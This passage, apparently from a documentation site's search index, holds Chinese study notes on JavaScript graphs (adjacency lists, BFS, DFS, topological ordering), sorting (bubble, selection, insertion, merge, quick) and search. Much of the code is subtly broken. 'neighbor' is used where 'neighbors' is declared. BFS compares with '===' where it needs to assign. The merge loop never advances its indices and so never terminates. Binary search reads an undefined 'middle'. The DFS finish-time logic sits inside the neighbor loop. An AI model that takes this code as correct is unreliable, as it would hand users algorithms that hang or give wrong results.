<p>\u6709\u5411\u56fe\uff1a\u8fb9\u662f\u4e00\u4e2a\u5411\u91cf\uff0c\u5177\u6709\u65b9\u5411\uff08\u4ea4\u901a\u56fe\uff09\uff1b\u65e0\u5411\u56fe\uff1a\u8fb9\u6ca1\u6709\u65b9\u5411\uff08\u4eba\u9645\u5708\uff09\uff1b\u5f3a\u8fde\u901a\uff08\u6bcf\u4e24\u4e2a\u9876\u70b9\u95f4\u53cc\u5411\u8fde\u901a\uff09</p> <p>\u52a0\u6743\uff1a\u8fb9\u5177\u6709\u6743\u503c</p> <p>\u56fe\u76f8\u5bf9\u4e4b\u524d\u7684\u6570\u636e\u7ed3\u6784\u6700\u590d\u6742\uff0c\u89e3\u51b3\u65b9\u6cd5\u5f88\u591a\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_14","title":"\u56fe\u7684\u4e09\u79cd\u8868\u793a","text":"<p>\u90bb\u63a5\u77e9\u9635\uff1a\u4f7f\u7528\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u5982\u679c\u4e24\u4e2a\u70b9\u6709\u8fb9\u90a3\u4e48\u5bf9\u5e94\u7684\u4e8c\u7ef4\u6570\u7ec4\u5c31\u662f1\uff0c\u5426\u5219\u5c31\u662f0.\uff08\u5982\u679c\u52a0\u6743\u56fe\uff0c\u90a3\u4e48\u6570\u503c\u5c31\u662f\u6743\u91cd\uff09\u3002\u5f0a\u7aef\uff1a\u5982\u679c\u4e00\u4e2a\u7a00\u758f\u56fe\uff08\u5185\u90e8\u8054\u7cfb\u8f83\u5c11\uff09\uff0c\u90a3\u4e48\u8fd9\u4e2a\u77e9\u9635\u9700\u8981\u5b58\u50a8\u5f88\u591a0\uff0c\u5360\u7528\u5185\u5bb9\u3002\u65b0\u5f00\u8f9f\u4e00\u4e2a\u9876\u70b9\u4f1a\u5360\u7528\u8f83\u591a\u5185\u5b58\uff0c\u9700\u8981\u8fed\u4ee3\u4e00\u884c\u3002</p> <p>\u90bb\u63a5\u8868\uff1a\u4f7f\u7528\u94fe\u8868\uff0c\u6563\u5217\u8868\uff0c\u5b57\u5178\u8868\u793a\u3002\u63cf\u8ff0\u6bcf\u4e00\u4e2a\u9876\u70b9\u7684\u94fe\u63a5\u5173\u7cfb\u3002</p> <p>\u5173\u8054\u77e9\u9635\uff1a\u4f7f\u7528\u9876\u70b9\u548c\u8fb9\u4f5c\u4e3a\u77e9\u9635\u7684\u4e24\u8fb9\uff0c\u9002\u5e94\u4e8e\u8fb9\u7684\u6570\u91cf\u5f88\u591a\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_15","title":"\u521b\u5efa\u56fe","text":"<p>\u4f7f\u7528\u90bb\u63a5\u8868\u65b9\u5f0f\uff08\u5b57\u5178\uff09</p> <pre><code>function Graph() {\n  let vertices = []; // \u5b58\u653e\u9876\u70b9\u6570\u7ec4\n  let adjList = new Dictionary(); // \u5b58\u653e\u9876\u70b9\u7684\u90bb\u63a5\u8868\n\n  // \u589e\u52a0\u4e00\u4e2a\u9876\u70b9\uff1a\u5c06\u9876\u70b9\u6dfb\u52a0\u5230\u9876\u70b9\u6570\u7ec4\u4e2d\uff0c\u5e76\u4e14\u5728\u9876\u70b9\u7684\u90bb\u63a5\u8868\u4e2d\u52a0\u5165\u5bf9\u5e94\u7684\u5c5e\u6027\uff08\u7a7a\u6570\u7ec4\uff09\n  this.addVertex = function(point) {\n    vertices.push(point);\n    adjList.set(point, []);\n  },\n\n  // \u589e\u52a0\u4e00\u4e2a\u8fb9\uff1a\u4f20\u5165\u4e24\u4e2a\u9876\u70b9\uff0c\u589e\u52a0\u90bb\u63a5\u8868\u4e2d\u4e24\u70b9\u95f4\u8fb9\n  this.addEdge = function(point, point2) {\n    adjList.get(point).push(point2);\n    adjList.get(point2).push(point); // \u5982\u679c\u662f\u6709\u5411\u56fe\uff0c\u9700\u8981\u5355\u5411\u6dfb\u52a0\u8fb9\uff1b\u65e0\u5411\u56fe\u9700\u8981\u6dfb\u52a0\u4e24\u4e2a\u8fb9\n  },\n\n  this.toString = function() {\n    let s = '';\n    for (let i = 0; i &lt; vertices.length; i++) {\n      s += vertices[i] + ' ';\n      let neighbors = adjList.get(vertices[i]);\n      for (let j = 0; j &lt; neighbor.length; j++) {\n        s += neighbor[j]\n      }\n      s += '\\n';\n    }\n    return s;\n  },\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_16","title":"\u904d\u5386\u56fe","text":"<p>\u904d\u5386\u7684\u76ee\u7684\uff1a\u5bfb\u627e\u67d0\u4e2a\u9876\u70b9\uff1b\u8ba1\u7b97\u4e24\u4e2a\u9876\u70b9\u7684\u8ddd\u79bb\uff1b\u68c0\u67e5\u56fe\u662f\u5426\u8fde\u901a\u6216\u8005\u6709\u73af\u7ed3\u6784</p> <p>\u7b97\u6cd5\uff1a\u83b7\u53d6\u7b2c\u4e00\u6b21\u8bbf\u95ee\u7684\u8282\u70b9\uff0c\u5e76\u4e14\u8bb0\u5f55\u6ca1\u6709\u88ab\u8bbf\u95ee\u7684\u8282\u70b9\uff08\u52a0\u5165\u5230\u5217\u8868\u4e2d\uff09</p> <p>\u904d\u5386\u7684\u65b9\u6cd5\uff1a\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff1b\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u3002\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u4f7f\u7528\u961f\u5217\uff0c\u628a\u5f85\u8bbf\u95ee\u7684\u8282\u70b9\u653e\u5165\u961f\u5217\u4e2d\uff0c\u5148\u5165\u7684\u8282\u70b9\u5148\u63a2\u7d22\uff08\u5148\u8bbf\u95ee\u5144\u5f1f\u8282\u70b9\uff09\uff1b\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u4f7f\u7528\u6808\uff0c\u5982\u679c\u5b58\u5728\u65b0\u7684\u9876\u70b9\u5c31\u53bb\u8bbf\u95ee\uff08\u5148\u8bbf\u95ee\u5b59\u5b50\u8282\u70b9\uff09\u3002\u4e3a\u4e86\u6548\u7387\uff0c\u6bcf\u4e2a\u8282\u70b9\u6700\u591a\u8bbf\u95ee\u4e24\u6b21\u3002</p> <p>\u9876\u70b9\u5206\u4e3a\u4e09\u79cd\u72b6\u6001\uff1a\u6ca1\u6709\u8bbf\u95ee\u5230\uff0c\u5df2\u7ecf\u8bbf\u95ee\u4f46\u662f\u6ca1\u6709\u6df1\u5165\u63a2\u7d22\uff1b\u5df2\u7ecf\u6df1\u5165\u63a2\u7d22\uff1b</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#1-bfs","title":"1\u3001\u5e7f\u5ea6\u4f18\u5148\u7b97\u6cd5 bfs","text":"<pre><code> let initializeColor = function() {\n  // \u8f85\u52a9\u51fd\u6570\uff1a\u521d\u59cb\u5316\u56fe\uff1a\u5168\u90e8\u7684\u8282\u70b9\u662f\u767d\u8272\uff08\u672a\u8bbf\u95ee\uff09\n  let color = [];\n  for (let i = 0; i &lt; vertices.length; i++) {\n    color[vertices[i]] = 'white';\n  }\n  return color;\n}\n\nthis.bfs = function(v, callback) {\n  // \u521d\u59cb\u5316\u56fe\uff08\u5168\u90e8\u8282\u70b9\u662f\u767d\u8272\uff09\n  let color = initializeColor();\n  let queue = new Queue();\n  // \u628a\u5f53\u524d\u8282\u70b9\u5165\u961f\u5217\n  queue.enqueue(v);\n\n  // \u5f53\u961f\u5217\u65f6\u975e\u7a7a\u65f6\n  while (!queue.isEmpty()) {\n    // \u7b2c\u4e00\u4e2a\u5143\u7d20\u51fa\u961f\u5217\n    let u = queue.dequeue();\n    // \u4ece\u5b57\u5178\u4e2d\u83b7\u53d6\u5f53\u524d\u8282\u70b9\u7684\u5168\u90e8\u76f8\u90bb\u8282\u70b9\n    let neighbors = adjList.get(u);\n    // \u8bbe\u7f6e\u8282\u70b9\u662f\u7070\u8272\uff08\u5df2\u7ecf\u8bbf\u95ee\uff0c\u4f46\u662f\u6ca1\u6709\u6df1\u5165\uff09\n    color[u] = 'grey';\n    // \u904d\u5386\u6bcf\u4e00\u4e2a\u76f8\u90bb\u8282\u70b9\n    for (let i = 0; i &lt; neighbors.length; i++) {\n      let w = neighbors[i];\n      // \u5982\u679c\u76f8\u90bb\u8282\u70b9\u6ca1\u6709\u88ab\u8bbf\u95ee\uff0c\u90a3\u4e48\u8bbe\u7f6e\u8fd9\u4e2a\u8282\u70b9\u88ab\u8bbf\u95ee\uff0c\u5e76\u4e14\u653e\u5165\u5f85\u904d\u5386\u7684\u961f\u5217\u4e2d\n      if (color[w] === 'white') {\n        color[w] === 'grey';\n        queue.enqueue(w);\n      }\n    }\n    // \u6df1\u5165\u540e\u7684\u8282\u70b9\u8bbe\u7f6e\u5c5e\u6027\u4e3a\u9ed1\u8272\n    color[u] = 'black';\n    // \u5982\u679c\u4f20\u5165\u56de\u8c03\u51fd\u6570\uff0c\u51fa\u961f\u5217\u7684\u8282\u70b9\u6267\u884c\u56de\u8c03\u51fd\u6570\n    if (callback) callback(u);\n  }\n}\n</code></pre> <p>\u6539\u8fdb\u7b97\u6cd5\uff1a\u4f7f\u7528BFS\u7b97\u6cd5\u8ba1\u7b97\u4e0d\u540c\u8282\u70b9\u7684\u8ddd\u79bb\uff1a\u5728\u904d\u5386\u76f8\u90bb\u8282\u70b9\u65f6\uff0c\u589e\u52a0\u4e00\u4e2a\u8ddd\u79bb\u53d8\u91cf\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b58\u50a8\u4e0d\u540c\u76f8\u90bb\u8282\u70b9\u548c\u521d\u59cb\u8282\u70b9\u7684\u4f4d\u7f6e\u3002\u4e0b\u9762\u662f\u4f18\u5316\u540e\u7684\u7b97\u6cd5</p> <p>\u7591\u95ee\uff1a\u5982\u679c\u662f\u5b50\u8282\u70b9\u6709\u4e0d\u540c\u7684\u8def\u5f84\uff0c\u901a\u8fc7\u591a\u4e2a\u8def\u5f84\u53ef\u4ee5\u8bbf\u95ee\u4e00\u4e2a\u8282\u70b9\uff0c\u90a3\u4e48\u54ea\u4e2a\u8def\u5f84\u662f\u6700\u77ed\u5bf9\u7684\u8def\u5f84\uff1f</p> <pre><code>let BFS = function(v) {\n  let color = initializeColor();\n  let queue = new Queue();\n  let d = []; // \u5b58\u653e\u4e0d\u540c\u8282\u70b9\u7684\u8def\u5f84\n  let pred = []; // \u5b58\u653e\u524d\u4e00\u4e2a\u8282\u70b9\uff0c\u7528\u6765\u8ba1\u7b97\u6700\u77ed\u8ddd\u79bb\n\n  queue.enqueue(v);\n\n  // \u521d\u59cb\u5316\u5168\u90e8\u7684\u8def\u5f84\u8ddd\u79bb\u662f0\uff0c\u524d\u4e00\u4e2a\u8282\u70b9\u662f\u7a7a\n  for (let i = 0; i &lt; vertices.length; i++) {\n    d[vertices[i]] = 0;\n    pred[vertices[i]] = null;\n  }\n\n  while (!queue.isEmpty()) {\n    let u = queue.dequeue();\n    let neighbors = adjList.get(u);\n    color[u] = 'grey';\n    for (let i = 0; i &lt; neighbors.length; i++) {\n      let w = neighbors[i];\n      if (color[w] === 'white') {\n        color[w] = 'grey';\n        // \u8def\u5f84\u589e\u52a0\uff0c\u8bbe\u7f6e\u524d\u4e00\u4e2a\u8282\u70b9\u4e3a\u7236\u8282\u70b9\n        d[w] = d[u] + 1;\n        pred[w] = u;\n        queue.enqueue(w);\n      }\n    }\n    color[u] = 'black';\n  }\n  return {\n    distances: d,\n    predecessors: pred,\n  };\n};\n\n// distances: [A: 0, B: 1, C: 1, D: 1, E: 2, F: 2, G: 2, H: 2 , I: 3],\n// predecessors: [A: null, B: \"A\", C: \"A\", D: \"A\", E: \"B\", F: \"B\", G:\"C\", H: \"D\", I: \"E\"]\n\n// \u7136\u540e\u8ba1\u7b97\u9876\u70b9\uff08A\uff09\u5230\u5176\u4ed6\u8282\u70b9\u7684\u8def\u5f84\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#2-dfs","title":"2\u3001\u6df1\u5ea6\u4f18\u5148\u7b97\u6cd5 dfs","text":"<p>\u9996\u5148\u63a2\u7d22\u4e00\u4e2a\u5206\u652f\uff0c\u6cbf\u7740\u8def\u5f84\u63a2\u7d22\uff0c\u76f4\u5230\u8fd9\u4e2a\u8def\u5f84\u88ab\u5168\u90e8\u63a2\u7d22\uff0c\u7136\u540e\u539f\u8def\u8fd4\u56de\u63a2\u7d22\u4e0b\u4e00\u4e2a\u8def\u5f84\u3002\u6df1\u5ea6\u4f18\u5148\u7b97\u6cd5\u662f\u9012\u5f52\u7684\uff0c\u6240\u4ee5\u4f7f\u7528\u6808\u66f4\u5408\u9002\u3002</p> <pre><code>// \u8f85\u52a9\u51fd\u6570\u548c\u4e0a\u9762\u76f8\u540c\n// \u5f00\u59cb\u7b2c\u4e00\u4e2a\u8282\u70b9\nthis.des = function(callback) {\n  let color = initializeColor();\n  for (let i = 0; i &lt; vertices.length; i++) {\n    if (color[vertices[i]] === 'white') {\n      dfsVisit(vertices[i], color, callback);\n    }\n  }\n}\n// \u8bbf\u95ee\u8282\u70b9\u51fd\u6570\nlet dfsVisit = function(u, color, callback) {\n  color[u] = 'grey';\n  if (callback) callback(u);\n  let neighbors = adjList.get(u);\n  for (let i = 0; i &lt; neighbors.length; i++) {\n    let w = neighbors[i];\n    if (color[w] === 'white') {\n      // \u9012\u5f52\u904d\u5386\u8fd9\u4e2a\u8282\u70b9\n      dfsVisit(w, color, callback);\n    }\n  }\n  // \u904d\u5386\u7ed3\u675f\u540e\uff0c\u8bbe\u7f6e\u5f53\u524d\u8282\u70b9\u662f\u9ed1\u8272\n  color[u] = 'black';\n}\n</code></pre> <p>\u6df1\u5ea6\u4f18\u5148\u7b97\u6cd5\u6539\u8fdb\uff1a\u6211\u4eec\u9700\u8981\u77e5\u9053\u4e00\u4e2a\u8282\u70b9\u53d8\u6210\u7070\u8272\uff08\u5f00\u59cb\u63a2\u7d22\uff09\u7684\u65f6\u95f4\uff0c\u4e00\u4e2a\u8282\u70b9\u53d8\u6210\u9ed1\u8272\uff08\u7ed3\u675f\u63a2\u7d22\u7684\u65f6\u95f4\uff09\u4ee5\u53ca\u8fd9\u4e2a\u8282\u70b9\u7684\u524d\u4e00\u4e2a\u8282\u70b9\uff08node\uff09</p> <p>\u4e0b\u9762\u662f\u6539\u8fdb\u7684 DFS \u7b97\u6cd5</p> <pre><code>let time;\n\nthis.DFS = function(callback) {\n  let color = initializeColor();\n  // \u8bbe\u7f6e\u521d\u59cb\u65f6\u95f4\u662f0\n  time = 0;\n  // \u521b\u5efa\u5f00\u59cb\u65f6\u95f4\u548c\u7ed3\u675f\u65f6\u95f4\u7684\u6570\u7ec4\n  let discovery = []; \n  let finished = [];\n  // \u5b58\u50a8\u524d\u4e00\u4e2a\u8282\u70b9\u7684\u6570\u7ec4\n  let predecessors = [];\n    for (let i = 0; i &lt; vertices.length; i++) {\n    discovery[vertices[i]] = 0;\n    finished[vertices[i]] = 0;\n    predecessors[vertices[i]] = null;\n  }\n  for (let i = 0; i &lt; vertices.length; i++) {\n    if (color[vertices[i]] === 'white') {\n      dfsVisit(vertices[i], color, discovery, finished, predecessors, callback);\n    }\n  }\n  return { discovery, finished, predecessors };\n}\n\ndfsVisit = (u, color, d, f, p, callback) =&gt; {\n  // \u5f00\u59cb\u63a2\u7d22U\u8282\u70b9\n  color[u] = 'grey';\n  d[u] = ++time;\n  if (callback) callback;\n  let neighbors = adjList.get(u);\n  for (let i = 0; i &lt; neighbors.length; i++) {\n    let w = neighbors[i];\n    if (color[w] === 'white') {\n      dfsVisit(w, color, d, f, p, callback);\n      p[w] = u;\n    }\n    color[u] = 'black';\n    f[u] = ++time;\n    // \u7ed3\u675f\u63a2\u7d22U\u8282\u70b9\n  }\n}\n</code></pre> <p>\u6539\u8fdb\u540e\u7684\u7b97\u6cd5\u6ee1\u8db3\uff08V\u8868\u793a\u8282\u70b9\u7684\u6570\u91cf\uff09\u901a\u8fc7 d[u] / f[u] \u53ef\u4ee5\u8ba1\u7b97\u4e0d\u540c\u8282\u70b9\u7684\u65f6\u95f4\u6bd4\u503c\uff0c\u53ef\u4ee5\u7528\u4e8e\u62d3\u6251\u6392\u5e8f</p> <p>1 \u2264 d[u] &lt; f[u] \u22642 |V|</p> <p>\u62d3\u6251\u6392\u5e8f\uff08DFS\u6269\u5c55\uff09</p> <p>\u5b9e\u4f8b\uff1a\u5982\u679c\u4e00\u4e9b\u4efb\u52a1\u7684\u6267\u884c\u65f6\u8fde\u7eed\u7684\uff08\u9700\u8981\u6b65\u9aa4\uff09\u7136\u540e\u4e0d\u540c\u7684\u4efb\u52a1\u6784\u6210\u4e0d\u540c\u7684\u8282\u70b9\uff0c\u8282\u70b9\u4e4b\u95f4\u53ef\u4ee5\u83b7\u53d6\u6700\u77ed\u8def\u5f84\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5177\u4f53\u904d\u5386\u8282\u70b9\u7684\u65f6\u95f4\uff0c\u53ef\u4ee5\u8ba1\u7b97\u591a\u79cd\u904d\u5386\u8282\u70b9\u7684\u60c5\u51b5\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_17","title":"\u7b2c\u5341\u7ae0 \u6392\u5e8f\u548c\u641c\u7d22\u7b97\u6cd5","text":"<p>\u6392\u5e8f\u7b97\u6cd5\u662f\u641c\u7d22\u7b97\u6cd5\u7684\u57fa\u7840</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_18","title":"\u6392\u5e8f\u7b97\u6cd5","text":"<p>\u7528\u6570\u7ec4\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684\u6570\u636e\u7ed3\u6784\u6765\u6392\u5e8f</p> <pre><code>function ArrayList() {\n  let arr = [];\n  this.insert = (item) =&gt; {\n    arr.push(item);\n  };\n  // \u9a8c\u8bc1\u6392\u5e8f\u7684\u7ed3\u679c\n  this.toString = () =&gt; {\n    console.log(arr.join(''));\n  }\n} \n</code></pre> <p>\u4e0b\u9762\u662f\u4e94\u4e2a\u6392\u5e8f\u7b97\u6cd5\uff0c\u7531\u5dee\u53d8\u597d</p> <p>PS\uff1a\u7b97\u6cd5\u5b9e\u9645\u6027\u80fd\u9700\u8981\u6839\u636e\u5177\u4f53\u95ee\u9898\u5224\u65ad\uff0c\u5728\u300a\u554a\u54c8\u7b97\u6cd5\u300b\u4e2d\u4ecb\u7ecd\u5230\uff0c\u5982\u679c\u6570\u7ec4\u5143\u7d20\u8303\u56f4\u8f83\u5c0f\uff0c\u6570\u636e\u91cd\u590d\u8f83\u591a\uff0c\u90a3\u4e48\u6876\u6392\u5e8f\u7684\u6027\u80fd\u4f18\u4e8e\u5feb\u901f\u6392\u5e8f\u7684\u6027\u80fd\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#1","title":"1 \u5192\u6ce1\u6392\u5e8f\u6cd5","text":"<pre><code>function ArrayList() {\n  let arr = [];\n  this.insert = (item) =&gt; {\n    arr.push(item);\n  };\n  this.toString = () =&gt; {\n    console.log(arr.join(''));\n  }\n\n  // \u7f3a\u70b9\uff1a\u5185\u5faa\u73af\u548c\u5916\u5faa\u73af\u6d88\u8017\u65f6\u95f4\uff0c\u9891\u7e41\u4ea4\u6362\u6570\u7ec4\u7684\u4f4d\u7f6e\u6d88\u8017\u5185\u5b58\u3002\n  bubbleSort = () =&gt; {\n    let len = arr.length;\n    for (let i = 0; i &lt; len; i++) {\n      for (let j = 0; j &lt; len - 1; j++) {\n        if (arr[j] &gt; arr[j + 1]) {\n          let k = arr[j + 1];\n          arr[j + 1] = arr[j];\n          arr[j] = k;\n        }\n      }\n    }\n  }\n  // \u6539\u8fdb\u7248\u5192\u6ce1\u6392\u5e8f\u6cd5\uff08\u5185\u5faa\u73af\u6b21\u6570\u51cf\u534a\uff09\n  bubbleSortUpdate = () =&gt; {\n    let len = arr.length;\n    for (let i = 0; i &lt; len; i++) {\n      for (let j = 0; j &lt; len - i - 1; j++) {\n        if (arr[j] &lt; arr[j + 1]) {\n          // \u4ea4\u6362\u51fd\u6570\uff0c\u4ea4\u6362\u6570\u7ec4\u4e2d\u4e24\u4e2a\u9879\u7684\u4f4d\u7f6e\uff1b\n          swap(arr[j], arr[j + 1]);\n        }\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#2","title":"2 \u9009\u62e9\u6392\u5e8f\u6cd5","text":"<p>\uff08\u904d\u5386\u6570\u7ec4\u83b7\u53d6\u6700\u5c0f\u503c\uff0c\u7136\u540e\u548c\u7b2c\u4e00\u4f4d\u4ea4\u6362\uff09\u65f6\u95f4\u590d\u6742\u5ea6n\u5e73\u65b9</p> <pre><code>selectionSort = () =&gt; {\n  let len = arr.length;\n  let minItem;\n  for (let i = 0; i &lt; len; i++) {\n    minItem = i;\n    for (let j = i; j &lt; len; j++) {\n      if (arr[minItem] &gt; arr[j]) {\n        minItem = j;\n      }\n    }\n    if (i !== minItem) {\n      swap(arr[i], arr[minItem]);\n    }\n  }\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#3","title":"3 \u63d2\u5165\u6392\u5e8f\u6cd5","text":"<p><sub>~</sub>js insertSort = () =&gt; {   let len = arr.length;   let j , temp;   for (let i = 0; i &lt; len; i++) {     j = i;     temp = arr[i];     while (j &gt; 0 &amp;&amp; arr[j - 1] &gt; temp) {       arr[j] = arr[j - 1];       j--;     }     arr[j] = temp;   } }   // \u524d\u4e09\u4e2a\u6027\u80fd\u4e0d\u597d\uff0c\u540e\u9762\u4e24\u4e2a\u6392\u5e8f\u53ef\u4ee5\u7528\u5728\u5b9e\u9645\u5de5\u4f5c\u4e2d   // \u4e0a\u9762\u7684\u4ee3\u7801\u628a\u4e00\u90e8\u5206\u53d8\u91cf\u5b9a\u4e49\u7684\u51fd\u6570\u5185\u90e8\u5f00\u59cb\u4f4d\u7f6e\uff0c\u4e0d\u5b9a\u4e49\u5728\u5faa\u73af\u5185\u90e8\uff0c\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u5185\u5b58\u3002 <pre><code>#### 4 \u5e76\u5f52\u6392\u5e8f\n\nnlogn \u706b\u72d0\u6d4f\u89c8\u5668\u4f7f\u7528\n\n\u601d\u8def\uff1a\u628a\u4e00\u4e2a\u6570\u7ec4\u5207\u5206\u6210\u5f88\u591a\u5c0f\u6570\u7ec4\uff0c\u7136\u540e\u5bf9\u6bcf\u4e2a\u5c0f\u6570\u7ec4\u6392\u5e8f\uff0c\u6700\u540e\u5c06\u5c0f\u6570\u7ec4\u5e76\u5f52\u4e00\u4e2a\u6392\u5e8f\u5b8c\u6574\u7684\u5927\u6570\u7ec4\u3002\n\n~~~js\nthis.mergeSort = function() {\n  array = mergeSortRect(array);\n}\n\nlet mergeSortRect = function(array) {\n  let len = array.length;\n  if (len === 1) {\n    return array;\n  }\n  let mid = Math.floor(len / 2);\n  let left = array.slice(0, mid);\n  let right = array.slice(mid, len);\n  return merge(mergeSortRect(left), mergeSortRect(right));\n}\n\nlet merge = function(left, right) {\n  let result = [];\n  let il = 0, ir = 0;\n  // \u7528\u65b0\u6570\u7ec4\u8fed\u4ee3\u4e24\u4e2a\u65e7\u6570\u7ec4\n  while (il &lt; left.length &amp;&amp; ir &lt; right.length) {\n    if (left[il] &lt; right[ir]) {\n      result.push(left[il]);\n    } else {\n      result.push(right[ir]);\n    }\n  }\n  while (il &lt; left.length) {\n    result.push(left[il]);\n  }\n  while (ir &lt; right.length) {\n    result.push(right[ir]);\n  }\n  return result;\n}\n</code></pre></p> <p>\u5e76\u5f52\u6392\u5e8f\u7684\u601d\u8def\uff1a\u5148\u628a\u590d\u6742\u95ee\u9898\u5206\u6210\u5c0f\u95ee\u9898\uff0c\u7136\u540e\u4ece\u591a\u4e2a\u7b80\u5355\u7684\u5c0f\u95ee\u9898\u4e2d\u627e\u5230\u7edf\u4e00\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u7136\u540e\u4f7f\u7528\u5c0f\u95ee\u9898\uff0c\u6700\u540e\u5c06\u4e0d\u540c\u7684\u5c0f\u95ee\u9898\u5e76\u5f52\u540e\uff0c\u5927\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#5","title":"5 \u5feb\u901f\u6392\u5e8f","text":"<p>\u5feb\u901f\u6392\u5e8f\u6cd5\u8f83\u590d\u6742\uff0c\u6027\u80fd\u6700\u597d nLogn\u3002</p> <p>\u601d\u60f3\uff1a\u9996\u5148\u83b7\u53d6\u6570\u7ec4\u7684\u4e2d\u95f4\u9879\uff08\u4e3b\u5143\uff09\uff1b\u7136\u540e\u8bbe\u7f6e\u7b2c\u4e00\u4e2a\u9879\u4e3a\u524d\u6307\u9488\uff0c\u6700\u540e\u4e00\u4e2a\u9879\u662f\u540e\u6307\u9488\u3002\u524d\u6307\u9488\u5411\u540e\u79fb\u52a8\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u6bd4\u4e2d\u95f4\u9879\u5927\u7684\u5143\u7d20\uff0c\u540e\u6307\u9488\u5411\u524d\u79fb\u52a8\uff0c\u627e\u5230\u4e00\u4e2a\u6bd4\u4e2d\u95f4\u9879\u5c0f\u7684\u5143\u7d20\uff0c\u4ea4\u6362\u4e24\u4e2a\u5143\u7d20\u7684\u4f4d\u7f6e\u3002\u7136\u540e\u7ee7\u7eed\u6267\u884c\uff0c\u76f4\u5230\u524d\u6307\u9488\u5927\u4e8e\u540e\u6307\u9488\u3002\u90a3\u4e48\u8fd9\u6837\u4e00\u8f6e\u8fc7\u540e\uff0c\u524d\u9762\u7684\u9879\u90fd\u6bd4\u4e2d\u95f4\u9879\u5c0f\uff0c\u540e\u9762\u7684\u9879\u90fd\u6bd4\u4e2d\u95f4\u9879\u5927\uff1b\u4e4b\u540e\u5229\u7528\u9012\u5f52\u7684\u601d\u60f3\uff0c\u628a\u6570\u7ec4\u5212\u5206\u6210\u524d\u540e\u4e24\u90e8\u5206\uff0c\u7ee7\u7eed\u6392\u5e8f\uff0c\u6700\u540e\u6392\u5e8f\u7ed3\u675f\u3002</p> <pre><code>this.quickSort = function() {\n  quick(array, 0, array.length - 1);\n}\n\nfunction quick(array, left, right) {\n  let index;\n  if (array.length &gt; 1) {\n    index = partition(array, left, right);\n    if (left &lt; index - 1) {\n      quick(array, left, index - 1);\n    }\n    if (index &lt; right) {\n      quick(array, index, right);\n    }\n  }\n}\n\nfunction partition(array, left, right) {\n  // \u4e3b\u5143\u53ef\u4ee5\u968f\u673a\u9009\u62e9\uff1b\u901a\u5e38\u9009\u62e9\u4e2d\u95f4\u4e00\u4e2a\u6392\u5e8f\u6027\u80fd\u8f83\u597d\n  let middle = array[Math.floor((left + right) / 2)];\n  let i = left, j = right;\n  while (i &lt; j) {\n    while (array[i] &lt; middle) {\n      i++;\n    }\n    while (array[j] &gt; middle) {\n      j--;\n    }\n    if (i &lt;= j) {\n      swapQuickSort(array, i, j);\n      i++;\n      j--;\n    }\n  }\n  return i;\n}\n\nfunction swapQuickSort(array, index1, index2) {\n  const temp = array[index1];\n  array[index1] = array[index2];\n  array[index2] = temp;\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_19","title":"\u641c\u7d22\u7b97\u6cd5","text":""},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#1_1","title":"1 \u987a\u5e8f\u641c\u7d22","text":"<p>\u6700\u4f4e\u6548\u7684\u641c\u7d22\u65b9\u6cd5\uff0c\u9700\u8981\u904d\u5386\u6574\u4e2a\u6570\u7ec4\u3002</p> <pre><code>function sequentialSearch(array, target) {\n  for (let i = 0; i &lt; array.length; i++) {\n    if (array[i] === target) {\n      return i;\n    }\n  }\n  return -1;\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#2_1","title":"2 \u4e8c\u5206\u641c\u7d22","text":"<p>\u8981\u6c42\u88ab\u641c\u7d22\u7684\u6570\u7ec4\u5df2\u7ecf\u6392\u5e8f\uff0c\u7136\u540e\u627e\u5230\u4e2d\u95f4\u7684\u503c\uff0c\u548c\u76ee\u6807\u503c\u76f8\u6bd4\u8f83\uff0c\u76f4\u5230\u627e\u5230\u76ee\u6807\u503c\u3002</p> <pre><code>this.binarySearch = function(target) {\n  this.quickSort();\n  let low = 0, height = array.length - 1;\n  let middle, element;\n  while (low &lt;= height) {\n    mid = Math.floor((low + height) / 2);\n    element = array[mid];\n    if (element &lt; target) {\n      low = middle + 1\n    } else if (element &gt; target) {\n      height = middle - 1;\n    } else {\n      return middle;\n    }\n  }\n  return -1;\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_20","title":"\u7b2c\u5341\u4e00\u7ae0 